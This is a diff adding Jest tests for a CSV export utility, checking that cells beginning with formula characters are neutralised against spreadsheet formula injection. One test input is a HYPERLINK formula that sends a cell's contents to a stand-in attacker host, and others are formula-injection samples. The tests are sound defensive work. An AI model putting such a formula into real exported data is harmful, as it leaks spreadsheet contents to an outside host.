@@ -128,6 +128,58 @@ describe('toCsv utility', () => {
     const expected = 'Lead Email,Age\njohn@example.com,30';
     expect(result).toBe(expected);
   });
+
+  it('prefixes text starting with =, +, -, @, tab or carriage return with a single quote (M50)', () => {
+    const columns = [{ key: 'value', label: 'Value' }];
+    const rows = [
+      { value: '=1+1' },
+      { value: '+44 20 7946 0000' },
+      { value: '-2+3' },
+      { value: '@SUM(A1:A2)' },
+      { value: '\t=1+1' },
+      { value: '\r=1+1' }
+    ];
+
+    const result = toCsv(rows, columns);
+    const expected = "Value\n'=1+1\n'+44 20 7946 0000\n'-2+3\n'@SUM(A1:A2)\n'\t=1+1\n\"'\r=1+1\"";
+    expect(result).toBe(expected);
+  });
+
+  it('quotes a neutralised formula that holds commas or quotes, keeping it one text cell (M50)', () => {
+    const columns = [
+      { key: 'subject', label: 'Subject' },
+      { key: 'body', label: 'Body' }
+    ];
+    const rows = [
+      { subject: 'Re: Pricing', body: '=HYPERLINK("https://evil.example/?d="&A1,"Click")' }
+    ];
+
+    const result = toCsv(rows, columns);
+    expect(result).toBe('Subject,Body\nRe: Pricing,"\'=HYPERLINK(""https://evil.example/?d=""&A1,""Click"")"');
+    expect(parseCsv(result)[1]).toEqual(['Re: Pricing', '\'=HYPERLINK("https://evil.example/?d="&A1,"Click")']);
+  });
+
+  it('neutralises joined arrays and nested values that start a formula (M50)', () => {
+    const columns = [
+      { key: 'groups', label: 'Groups' },
+      { key: 'lead.name', label: 'Lead Name' }
+    ];
+    const rows = [{ groups: ['=cmd', 'Leads'], lead: { name: '@evil' } }];
+
+    expect(toCsv(rows, columns)).toBe("Groups,Lead Name\n'=cmd; Leads,'@evil");
+  });
+
+  it('leaves numbers, empty cells and formula characters after the first alone (M50)', () => {
+    const columns = [
+      { key: 'score', label: 'Score' },
+      { key: 'name', label: 'Name' },
+      { key: 'email', label: 'Email' },
+      { key: 'note', label: 'Note' }
+    ];
+    const rows = [{ score: -5, name: 'Mary-Jane', email: 'a+b@x.com', note: '' }];
+
+    expect(toCsv(rows, columns)).toBe('Score,Name,Email,Note\n-5,Mary-Jane,a+b@x.com,');
+  });
 });
 
 const BOM = String.fromCharCode(0xfeff);
